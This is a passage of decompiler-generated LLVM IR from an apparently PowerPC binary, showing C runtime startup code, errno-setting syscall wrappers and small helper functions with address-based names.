dec_label_pc_10009064:                            ; preds = %dec_label_pc_10009050
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000906c = ptrtoint i32* %stack_var_-176 to i32
  store i32 268472436, i32* @lr, align 4
  %v4_10009070 = call i32 @function_1000b7d8(i32 17, i32* null, i32 %v2_1000906c)
  store i32 %v4_10009070, i32* %r3.global-to-local, align 4
  %tmp33 = icmp sgt i32 %v4_10009070, -1
  br i1 %tmp33, label %dec_label_pc_100090a4, label %dec_label_pc_1000907c

dec_label_pc_1000907c:                            ; preds = %dec_label_pc_10009064
  %v0_1000907c = call i32 @function_10004e38()
  store i32 %v0_1000907c, i32* %r3.global-to-local, align 4
  %v1_10009084 = inttoptr i32 %v0_1000907c to i32*
  %v2_10009084 = load i32, i32* %v1_10009084, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268472472, i32* @lr, align 4
  %v3_10009094 = call i32 @function_10009a08(i32 2, i32 %v2_10008ff4, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000909c = inttoptr i32 %v0_1000907c to i32*
  store i32 %v2_10009084, i32* %v2_1000909c, align 4
  %v0_1000915c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000914c

dec_label_pc_100090a4:                            ; preds = %dec_label_pc_10009064
  %v3_100090a4 = load i32, i32* %stack_var_-176, align 4
  %v3_100090b0 = icmp eq i32 %v3_100090a4, 1
  br i1 %v3_100090b0, label %dec_label_pc_100090b8, label %dec_label_pc_100090ec

dec_label_pc_100090b8:                            ; preds = %dec_label_pc_100090a4
  store i32 %v2_10008fb0, i32* %r3.global-to-local, align 4
  store i32 268472516, i32* @lr, align 4
  %v2_100090c0 = call i32 @function_10009878(i32 %v2_10008fb0, i32 %v2_10008fb0)
  store i32 %v2_100090c0, i32* %r3.global-to-local, align 4
  store i32 %v2_100090c0, i32* @r31, align 4
  %v0_100090c8 = call i32 @function_10004e38()
  store i32 %v0_100090c8, i32* %r3.global-to-local, align 4
  %v1_100090cc = inttoptr i32 %v0_100090c8 to i32*
  %v2_100090cc = load i32, i32* %v1_100090cc, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268472548, i32* @lr, align 4
  %v3_100090e0 = call i32 @function_10009a08(i32 2, i32 %v2_10008ff4, i32 0)
  store i32 %v3_100090e0, i32* %r3.global-to-local, align 4
  %v2_100090e4 = inttoptr i32 %v0_100090c8 to i32*
  store i32 %v2_100090cc, i32* %v2_100090e4, align 4
  %v0_10009114.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009114

dec_label_pc_100090ec:                            ; preds = %dec_label_pc_100090a4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268472572, i32* @lr, align 4
  %v3_100090f8 = call i32 @function_10009a08(i32 2, i32 %v2_10008ff4, i32 0)
  br label %dec_label_pc_10009108

dec_label_pc_10009108:                            ; preds = %dec_label_pc_10009010, %dec_label_pc_100090ec
  store i32 %v2_10008fb0, i32* %r3.global-to-local, align 4
  store i32 268472592, i32* @lr, align 4
  %v2_1000910c = call i32 @function_10009878(i32 %v2_10008fb0, i32 %v2_10008fb0)
  store i32 %v2_1000910c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009114

dec_label_pc_10009114:                            ; preds = %dec_label_pc_100090b8, %dec_label_pc_10009108
  %v0_10009114 = phi i32 [ %v0_10009114.pr, %dec_label_pc_100090b8 ], [ %v2_1000910c, %dec_label_pc_10009108 ]
  %v3_10009114 = icmp eq i32 %v0_10009114, 0
  br i1 %v3_10009114, label %dec_label_pc_10009140, label %dec_label_pc_1000911c

dec_label_pc_1000911c:                            ; preds = %dec_label_pc_10009114
  %v3_1000912c = load i32, i32* %stack_var_-440, align 4
  %v0_10009130 = call i32 @__asm_mfcr()
  store i32 %v0_10009130, i32* %r3.global-to-local, align 4
  %v1_10009134 = call i32 @__asm_rlwinm(i32 %v0_10009130, i32 30, i32 31, i32 31)
  %v2_10009138 = add i32 %v3_1000912c, %v1_10009134
  store i32 %v2_10009138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000914c

dec_label_pc_10009140:                            ; preds = %dec_label_pc_10009114, %dec_label_pc_10008f8c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000914c

dec_label_pc_10009148:                            ; preds = %dec_label_pc_10008ff4, %dec_label_pc_10009050, %dec_label_pc_10008fd0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000914c

dec_label_pc_1000914c:                            ; preds = %dec_label_pc_10009140, %dec_label_pc_1000911c, %dec_label_pc_1000907c, %dec_label_pc_10009148
  %v0_1000915c = phi i32 [ 0, %dec_label_pc_10009140 ], [ %v2_10009138, %dec_label_pc_1000911c ], [ %v0_1000915c.pre, %dec_label_pc_1000907c ], [ -1, %dec_label_pc_10009148 ]
  ret i32 %v0_1000915c

; uselistorder directives
  uselistorder i32 %v1_1000904c, { 1, 0 }
  uselistorder i32 %v2_10008ff4, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v2_10008fd0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10008fcc, { 1, 0 }
  uselistorder i32 %v2_10008fb0, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 1, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 6, 7, 1, 4, 5, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 6, 7, 1, 4, 5, 8, 9 }
  uselistorder i32 (i32, i32)* @function_10009878, { 1, 0 }
  uselistorder label %dec_label_pc_1000914c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009148, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009114, { 1, 0 }
  uselistorder label %dec_label_pc_10009108, { 1, 0 }
  uselistorder label %dec_label_pc_1000903c.dec_label_pc_1000903c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10008fbc.dec_label_pc_10008fbc_crit_edge, { 1, 0 }
}

define i32 @function_10009160(i32 %arg1) local_unnamed_addr {
dec_label_pc_100091b0:
  %v3_100091b4 = load i32, i32* @global_var_100104b0.290, align 4
  %v3_100091b8 = icmp eq i32 %v3_100091b4, 0
  br i1 %v3_100091b8, label %dec_label_pc_100091c8, label %dec_label_pc_100091c0

dec_label_pc_100091c0:                            ; preds = %dec_label_pc_100091b0
  %v2_100091c4 = load i32, i32* @r4, align 4
  %v3_100091c4 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_100091c4)
  store i32 %v3_100091c4, i32* @r3, align 4
  br label %dec_label_pc_100091c8

dec_label_pc_100091c8:                            ; preds = %dec_label_pc_100091b0, %dec_label_pc_100091c0
  %v3_100091cc = load i32, i32* @global_var_100104b4.291, align 4
  %v3_100091d0 = icmp eq i32 %v3_100091cc, 0
  br i1 %v3_100091d0, label %dec_label_pc_100091c8.dec_label_pc_100091e0_crit_edge, label %dec_label_pc_100091d8

dec_label_pc_100091c8.dec_label_pc_100091e0_crit_edge: ; preds = %dec_label_pc_100091c8
  %v0_100091f0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100091e0

dec_label_pc_100091d8:                            ; preds = %dec_label_pc_100091c8
  %v2_100091dc = load i32, i32* @r4, align 4
  %v3_100091dc = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 %v2_100091dc)
  br label %dec_label_pc_100091e0

dec_label_pc_100091e0:                            ; preds = %dec_label_pc_100091c8.dec_label_pc_100091e0_crit_edge, %dec_label_pc_100091d8
  %v0_100091f0 = phi i32 [ %v0_100091f0.pre, %dec_label_pc_100091c8.dec_label_pc_100091e0_crit_edge ], [ %v3_100091dc, %dec_label_pc_100091d8 ]
  ret i32 %v0_100091f0

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100091e0, { 1, 0 }
  uselistorder label %dec_label_pc_100091c8, { 1, 0 }
}

define i32 @function_100091f4() local_unnamed_addr {
dec_label_pc_100091f4:
  ret i32 0
}

define i32 @function_100091fc() local_unnamed_addr {
dec_label_pc_100091fc:
  %v0_100091fc = load i32, i32* @r3, align 4
  ret i32 %v0_100091fc
}

define i32 @function_10009200(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009200:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268472868, i32* @lr, align 4
  %v2_10009220 = call i32 @function_100095a4(i32 1, i32 1)
  %v3_10009224 = icmp eq i32 %v2_10009220, -1
  br i1 %v3_10009224, label %dec_label_pc_1000922c, label %dec_label_pc_1000924c

dec_label_pc_1000922c:                            ; preds = %dec_label_pc_10009200
  %v0_10009230 = load i32, i32* @r30, align 4
  store i32 268472896, i32* @lr, align 4
  %v3_1000923c = call i32 @function_100098c0(i32 ptrtoint ([10 x i8]* @global_var_1000f20c.292 to i32), i32 %v0_10009230)
  %v1_10009240 = load i32, i32* @r31, align 4
  %v4_10009240 = icmp eq i32 %v3_1000923c, %v1_10009240
  br i1 %v4_10009240, label %dec_label_pc_1000924c, label %dec_label_pc_10009248

dec_label_pc_10009248:                            ; preds = %dec_label_pc_1000922c
  %v1_10009248 = call i32 @function_1000b914(i32 %v3_1000923c)
  br label %dec_label_pc_1000924c

dec_label_pc_1000924c:                            ; preds = %dec_label_pc_10009200, %dec_label_pc_1000922c, %dec_label_pc_10009248
  %v0_1000925c = phi i32 [ %v2_10009220, %dec_label_pc_10009200 ], [ %v3_1000923c, %dec_label_pc_1000922c ], [ %v1_10009248, %dec_label_pc_10009248 ]
  ret i32 %v0_1000925c

; uselistorder directives
  uselistorder label %dec_label_pc_1000924c, { 2, 1, 0 }
}

define i32 @function_10009260(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009260:
  %v3_1000927c = load i32, i32* @global_var_100104b8.293, align 4
  %v3_10009284 = icmp eq i32 %v3_1000927c, 0
  br i1 %v3_10009284, label %dec_label_pc_100092a8, label %dec_label_pc_10009260.dec_label_pc_100092cc_crit_edge

dec_label_pc_10009260.dec_label_pc_100092cc_crit_edge: ; preds = %dec_label_pc_10009260
  %v0_100092dc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100092cc

dec_label_pc_100092a8:                            ; preds = %dec_label_pc_10009260
  store i32 1, i32* @global_var_100104b8.293, align 4
  store i32 4096, i32* @global_var_100104ac.199, align 4
  %v1_100092c8 = call i32 @function_100056f4(i32 268457716)
  br label %dec_label_pc_100092cc

dec_label_pc_100092cc:                            ; preds = %dec_label_pc_10009260.dec_label_pc_100092cc_crit_edge, %dec_label_pc_100092a8
  %v0_100092dc = phi i32 [ %v0_100092dc.pre, %dec_label_pc_10009260.dec_label_pc_100092cc_crit_edge ], [ %v1_100092c8, %dec_label_pc_100092a8 ]
  ret i32 %v0_100092dc

; uselistorder directives
  uselistorder label %dec_label_pc_100092cc, { 1, 0 }
}

define i32 @function_100092e0(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100092e0:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v1_100092f0 = mul i32 %arg2, 4
  store i32 %tmp, i32* @r30, align 4
  %v2_100092fc = add i32 %tmp, %v1_100092f0
  %v0_10009300 = load i32, i32* @r9, align 4
  store i32 %v0_10009300, i32* @global_var_100104a4.294, align 4
  %v1_10009304 = add i32 %v2_100092fc, 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10009304, i32* @global_var_100104a8.289, align 4
  store i32 %arg6, i32* @global_var_100104b4.291, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* @r27, align 4
  %v2_10009328 = load i32, i32* %arg3, align 4
  %v4_1000932c = icmp eq i32 %v1_10009304, %v2_10009328
  br i1 %v4_1000932c, label %dec_label_pc_10009334, label %dec_label_pc_10009338

dec_label_pc_10009334:                            ; preds = %dec_label_pc_100092e0
  store i32 %v2_100092fc, i32* @global_var_100104a8.289, align 4
  br label %dec_label_pc_10009338

dec_label_pc_10009338:                            ; preds = %dec_label_pc_100092e0, %dec_label_pc_10009334
  %v2_10009338 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268473160, i32* @lr, align 4
  %v3_10009344 = call i32 @function_100071a0(i32 %v2_10009338, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_100104a8.289, align 4
  br label %dec_label_pc_10009354

dec_label_pc_10009354:                            ; preds = %dec_label_pc_10009354, %dec_label_pc_10009338
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10009338 ], [ %v1_10009358, %dec_label_pc_10009354 ]
  %v1_10009354 = inttoptr i32 %storemerge to i32*
  %v2_10009354 = load i32, i32* %v1_10009354, align 4
  %v1_10009358 = add i32 %storemerge, 4
  %v3_1000935c = icmp eq i32 %v2_10009354, 0
  br i1 %v3_1000935c, label %dec_label_pc_10009364, label %dec_label_pc_10009354

dec_label_pc_10009364:                            ; preds = %dec_label_pc_10009354
  store i32 %v1_10009358, i32* %r29.global-to-local, align 4
  %v1_1000939012 = inttoptr i32 %v1_10009358 to i32*
  %v2_1000939013 = load i32, i32* %v1_1000939012, align 4
  %v3_1000939416 = icmp eq i32 %v2_1000939013, 0
  br i1 %v3_1000939416, label %dec_label_pc_1000939c, label %dec_label_pc_1000936c

dec_label_pc_1000936c:                            ; preds = %dec_label_pc_10009364, %dec_label_pc_1000938c
  %v0_10009380 = phi i32 [ %v1_1000938c, %dec_label_pc_1000938c ], [ %v1_10009358, %dec_label_pc_10009364 ]
  %v0_10009374 = phi i32 [ %v2_10009390, %dec_label_pc_1000938c ], [ %v2_1000939013, %dec_label_pc_10009364 ]
  %v2_1000936c = icmp ugt i32 %v0_10009374, 14
  br i1 %v2_1000936c, label %dec_label_pc_1000938c, label %dec_label_pc_10009374

dec_label_pc_10009374:                            ; preds = %dec_label_pc_1000936c
  %v1_10009374 = mul i32 %v0_10009374, 8
  %v2_1000937c = add i32 %v1_10009374, %v2_10009338
  store i32 %v2_1000937c, i32* @r3, align 4
  store i32 %v0_10009380, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268473228, i32* @lr, align 4
  %v0_10009388 = call i32 @function_10007104()
  %v0_1000938c.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000938c

dec_label_pc_1000938c:                            ; preds = %dec_label_pc_1000936c, %dec_label_pc_10009374
  %v0_1000938c = phi i32 [ %v0_10009380, %dec_label_pc_1000936c ], [ %v0_1000938c.pre, %dec_label_pc_10009374 ]
  %v1_1000938c = add i32 %v0_1000938c, 8
  store i32 %v1_1000938c, i32* %r29.global-to-local, align 4
  %v1_10009390 = inttoptr i32 %v1_1000938c to i32*
  %v2_10009390 = load i32, i32* %v1_10009390, align 4
  %v3_10009394 = icmp eq i32 %v2_10009390, 0
  br i1 %v3_10009394, label %dec_label_pc_1000939c, label %dec_label_pc_1000936c

dec_label_pc_1000939c:                            ; preds = %dec_label_pc_1000938c, %dec_label_pc_10009364
  %v1_100093a0 = call i32 @function_1000ba64(i32 %v2_10009338)
  store i32 %v1_100093a0, i32* @r3, align 4
  store i32 268473256, i32* @lr, align 4
  %v1_100093a4 = call i32 @function_10009260(i32 %v1_100093a0)
  %v3_100093ac = icmp eq i32 %tmp27, 0
  br i1 %v3_100093ac, label %dec_label_pc_100093b4, label %dec_label_pc_100093b8

dec_label_pc_100093b4:                            ; preds = %dec_label_pc_1000939c
  br label %dec_label_pc_100093b8

dec_label_pc_100093b8:                            ; preds = %dec_label_pc_1000939c, %dec_label_pc_100093b4
  %v0_100093bc = phi i32 [ %tmp27, %dec_label_pc_1000939c ], [ 4096, %dec_label_pc_100093b4 ]
  store i32 %v0_100093bc, i32* @global_var_100104ac.199, align 4
  %v3_100093c4 = icmp eq i32 %tmp26, -1
  br i1 %v3_100093c4, label %dec_label_pc_100093cc, label %dec_label_pc_10009400

dec_label_pc_100093cc:                            ; preds = %dec_label_pc_100093b8
  store i32 268473296, i32* @lr, align 4
  %v1_100093cc = call i32 @function_10009830(i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  store i32 %v1_100093cc, i32* %r29.global-to-local, align 4
  store i32 268473304, i32* @lr, align 4
  %v0_100093d4 = call i32 @function_100097a0()
  %v4_100093d8 = icmp eq i32 %v1_100093cc, %v0_100093d4
  br i1 %v4_100093d8, label %dec_label_pc_100093e0, label %dec_label_pc_1000941c

dec_label_pc_100093e0:                            ; preds = %dec_label_pc_100093cc
  store i32 268473316, i32* @lr, align 4
  %v1_100093e0 = call i32 @function_100097e8(i32 %v0_100093d4)
  store i32 %v1_100093e0, i32* %r29.global-to-local, align 4
  store i32 268473324, i32* @lr, align 4
  %v0_100093e8 = call i32 @function_10009758()
  %v4_100093ec = icmp eq i32 %v1_100093e0, %v0_100093e8
  br i1 %v4_100093ec, label %dec_label_pc_100093f4.thread, label %dec_label_pc_1000941c

dec_label_pc_100093f4.thread:                     ; preds = %dec_label_pc_100093e0
  br label %dec_label_pc_1000944c

dec_label_pc_10009400:                            ; preds = %dec_label_pc_100093b8
  %v4_10009404 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10009404, label %dec_label_pc_1000940c, label %dec_label_pc_1000941c

dec_label_pc_1000940c:                            ; preds = %dec_label_pc_10009400
  br label %dec_label_pc_1000941c

dec_label_pc_1000941c:                            ; preds = %dec_label_pc_1000940c, %dec_label_pc_10009400, %dec_label_pc_100093e0, %dec_label_pc_100093cc
  store i32 268473388, i32* @lr, align 4
  %v2_10009428 = call i32 @function_10009200(i32 0, i32 32768)
  store i32 268473404, i32* @lr, align 4
  %v2_10009438 = call i32 @function_10009200(i32 1, i32 32770)
  store i32 268473420, i32* @lr, align 4
  %v2_10009448 = call i32 @function_10009200(i32 2, i32 32770)
  br label %dec_label_pc_1000944c

dec_label_pc_1000944c:                            ; preds = %dec_label_pc_100093f4.thread, %dec_label_pc_1000941c
  %v0_1000944c = load i32, i32* @r30, align 4
  %v1_1000944c = inttoptr i32 %v0_1000944c to i32*
  %v2_1000944c = load i32, i32* %v1_1000944c, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000944c, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1092) to i32*), align 4
  %v0_10009478 = load i32, i32* @r27, align 4
  store i32 %v0_10009478, i32* @global_var_100104b0.290, align 4
  br i1 false, label %dec_label_pc_10009480, label %dec_label_pc_100094f8

dec_label_pc_10009480:                            ; preds = %dec_label_pc_1000944c, %dec_label_pc_10009480
  br i1 undef, label %dec_label_pc_10009480, label %dec_label_pc_100094f8

dec_label_pc_100094f8:                            ; preds = %dec_label_pc_10009480, %dec_label_pc_1000944c
  %v0_100094a4 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_100094a4)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10009508 = call i32 @function_10004e38()
  %v2_10009510 = inttoptr i32 %v0_10009508 to i32*
  store i32 0, i32* %v2_10009510, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 -25912), i32 0), label %dec_label_pc_10009530, label %dec_label_pc_10009524

dec_label_pc_10009524:                            ; preds = %dec_label_pc_100094f8
  %v0_10009524 = call i32 @function_10009ac8()
  %v2_1000952c = inttoptr i32 %v0_10009524 to i32*
  store i32 0, i32* %v2_1000952c, align 4
  br label %dec_label_pc_10009530

dec_label_pc_10009530:                            ; preds = %dec_label_pc_100094f8, %dec_label_pc_10009524
  %v0_1000953c = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000953c)
  %v0_10009548 = call i32 @function_10008dd4()
  ret i32 %v0_10009548

; uselistorder directives
  uselistorder i32 %v2_10009390, { 1, 0 }
  uselistorder i32 %v1_1000938c, { 2, 1, 0 }
  uselistorder i32 %v1_10009358, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10009338, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_10008dd4, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 1092, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_10009200, { 2, 1, 0 }
  uselistorder i32 4096, { 0, 2, 7, 8, 1, 6, 3, 4, 5 }
  uselistorder i32 14, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10009530, { 1, 0 }
  uselistorder label %dec_label_pc_10009480, { 1, 0 }
  uselistorder label %dec_label_pc_1000944c, { 1, 0 }
  uselistorder label %dec_label_pc_100093b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000938c, { 1, 0 }
  uselistorder label %dec_label_pc_1000936c, { 1, 0 }
  uselistorder label %dec_label_pc_10009338, { 1, 0 }
}

define i32 @function_1000954c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000954c:
  %v0_10009554 = load i32, i32* @lr, align 4
  %v1_10009554 = load i1, i1* @cr0_so, align 1
  %v2_10009554 = xor i1 %v1_10009554, true
  call void @__pseudo_cond_branch(i1 %v2_10009554, i32 %v0_10009554)
  %v0_10009558 = call i32 @function_1000ba80()
  ret i32 %v0_10009558

; uselistorder directives
  uselistorder i1* @cr0_so, { 1, 0 }
}

define i32 @function_1000955c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000955c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009574 = call i32 @__asm_mfcr()
  %v1_10009578 = and i32 %v0_10009574, 268435456
  %v3_10009578 = icmp eq i32 %v1_10009578, 0
  store i32 %v0_10009574, i32* %r31.global-to-local, align 4
  br i1 %v3_10009578, label %dec_label_pc_10009590, label %dec_label_pc_10009584

dec_label_pc_10009584:                            ; preds = %dec_label_pc_1000955c
  %v0_10009584 = call i32 @function_10004e38()
  %v0_10009588 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009588 = inttoptr i32 %v0_10009584 to i32*
  store i32 %v0_10009588, i32* %v2_10009588, align 4
  br label %dec_label_pc_10009590

dec_label_pc_10009590:                            ; preds = %dec_label_pc_1000955c, %dec_label_pc_10009584
  %v0_100095a0 = phi i32 [ %v0_10009574, %dec_label_pc_1000955c ], [ -1, %dec_label_pc_10009584 ]
  ret i32 %v0_100095a0

; uselistorder directives
  uselistorder label %dec_label_pc_10009590, { 1, 0 }
}

define i32 @function_100095a4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100095a4:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_100095b4 = add i32 %arg2, -12
  %v2_100095bc = icmp ugt i32 %v1_100095b4, 2
  %v2_100095c0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100095c0, i32* %stack_var_-32, align 4
  br i1 %v2_100095bc, label %dec_label_pc_100095f0, label %dec_label_pc_100095e0

dec_label_pc_100095e0:                            ; preds = %dec_label_pc_100095a4
  store i32 268473832, i32* @lr, align 4
  %v2_100095e4 = call i32 @function_10009628(i32 3)
  store i32 %v2_100095e4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009610

dec_label_pc_100095f0:                            ; preds = %dec_label_pc_100095a4
  %v0_100095f4 = call i32 @__asm_mfcr()
  %v1_100095f8 = and i32 %v0_100095f4, 268435456
  %v3_100095f8 = icmp eq i32 %v1_100095f8, 0
  store i32 %v0_100095f4, i32* %r31.global-to-local, align 4
  br i1 %v3_100095f8, label %dec_label_pc_10009610, label %dec_label_pc_10009604

dec_label_pc_10009604:                            ; preds = %dec_label_pc_100095f0
  %v0_10009604 = call i32 @function_10004e38()
  %v0_10009608 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009608 = inttoptr i32 %v0_10009604 to i32*
  store i32 %v0_10009608, i32* %v2_10009608, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009610

dec_label_pc_10009610:                            ; preds = %dec_label_pc_100095f0, %dec_label_pc_100095e0, %dec_label_pc_10009604
  %v0_10009614 = phi i32 [ %v0_100095f4, %dec_label_pc_100095f0 ], [ %v2_100095e4, %dec_label_pc_100095e0 ], [ -1, %dec_label_pc_10009604 ]
  ret i32 %v0_10009614

; uselistorder directives
  uselistorder i32 -12, { 4, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10009610, { 2, 0, 1 }
}

define i32 @function_10009628(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009628:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000963c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000963c, i32* %stack_var_-32, align 4
  %v0_1000965c = call i32 @__asm_mfcr()
  %v1_10009660 = and i32 %v0_1000965c, 268435456
  %v3_10009660 = icmp eq i32 %v1_10009660, 0
  store i32 %v0_1000965c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009660, label %dec_label_pc_10009678, label %dec_label_pc_1000966c

dec_label_pc_1000966c:                            ; preds = %dec_label_pc_10009628
  %v0_1000966c = call i32 @function_10004e38()
  %v0_10009670 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009670 = inttoptr i32 %v0_1000966c to i32*
  store i32 %v0_10009670, i32* %v2_10009670, align 4
  br label %dec_label_pc_10009678

dec_label_pc_10009678:                            ; preds = %dec_label_pc_10009628, %dec_label_pc_1000966c
  %v0_10009688 = phi i32 [ %v0_1000965c, %dec_label_pc_10009628 ], [ -1, %dec_label_pc_1000966c ]
  ret i32 %v0_10009688

; uselistorder directives
  uselistorder label %dec_label_pc_10009678, { 1, 0 }
}

define i32 @function_1000968c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000968c:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_100096a0

dec_label_pc_100096a0:                            ; preds = %dec_label_pc_100096a0.backedge, %dec_label_pc_1000968c
  %v0_100096ac = call i32 @__asm_mfcr()
  %v1_100096b0 = and i32 %v0_100096ac, 268435456
  %v3_100096b0 = icmp eq i32 %v1_100096b0, 0
  store i32 %v0_100096ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100096b0, label %dec_label_pc_100096a0.backedge, label %dec_label_pc_100096bc

dec_label_pc_100096bc:                            ; preds = %dec_label_pc_100096a0
  %v0_100096bc = call i32 @function_10004e38()
  %v0_100096c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100096c0 = inttoptr i32 %v0_100096bc to i32*
  store i32 %v0_100096c0, i32* %v2_100096c0, align 4
  br label %dec_label_pc_100096a0.backedge

dec_label_pc_100096a0.backedge:                   ; preds = %dec_label_pc_100096bc, %dec_label_pc_100096a0
  br label %dec_label_pc_100096a0
}

define i32 @function_100096c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100096c8:
  %r31.global-to-local = alloca i32, align 4
  %v0_100096e0 = call i32 @__asm_mfcr()
  %v1_100096e4 = and i32 %v0_100096e0, 268435456
  %v3_100096e4 = icmp eq i32 %v1_100096e4, 0
  store i32 %v0_100096e0, i32* %r31.global-to-local, align 4
  br i1 %v3_100096e4, label %dec_label_pc_100096fc, label %dec_label_pc_100096f0

dec_label_pc_100096f0:                            ; preds = %dec_label_pc_100096c8
  %v0_100096f0 = call i32 @function_10004e38()
  %v0_100096f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100096f4 = inttoptr i32 %v0_100096f0 to i32*
  store i32 %v0_100096f4, i32* %v2_100096f4, align 4
  br label %dec_label_pc_100096fc

dec_label_pc_100096fc:                            ; preds = %dec_label_pc_100096c8, %dec_label_pc_100096f0
  %v0_1000970c = phi i32 [ %v0_100096e0, %dec_label_pc_100096c8 ], [ -1, %dec_label_pc_100096f0 ]
  ret i32 %v0_1000970c

; uselistorder directives
  uselistorder label %dec_label_pc_100096fc, { 1, 0 }
}

define i32 @function_10009710(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009710:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009728 = call i32 @__asm_mfcr()
  %v1_1000972c = and i32 %v0_10009728, 268435456
  %v3_1000972c = icmp eq i32 %v1_1000972c, 0
  store i32 %v0_10009728, i32* %r31.global-to-local, align 4
  br i1 %v3_1000972c, label %dec_label_pc_10009744, label %dec_label_pc_10009738

dec_label_pc_10009738:                            ; preds = %dec_label_pc_10009710
  %v0_10009738 = call i32 @function_10004e38()
  %v0_1000973c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000973c = inttoptr i32 %v0_10009738 to i32*
  store i32 %v0_1000973c, i32* %v2_1000973c, align 4
  br label %dec_label_pc_10009744

dec_label_pc_10009744:                            ; preds = %dec_label_pc_10009710, %dec_label_pc_10009738
  %v0_10009754 = phi i32 [ %v0_10009728, %dec_label_pc_10009710 ], [ -1, %dec_label_pc_10009738 ]
  ret i32 %v0_10009754

; uselistorder directives
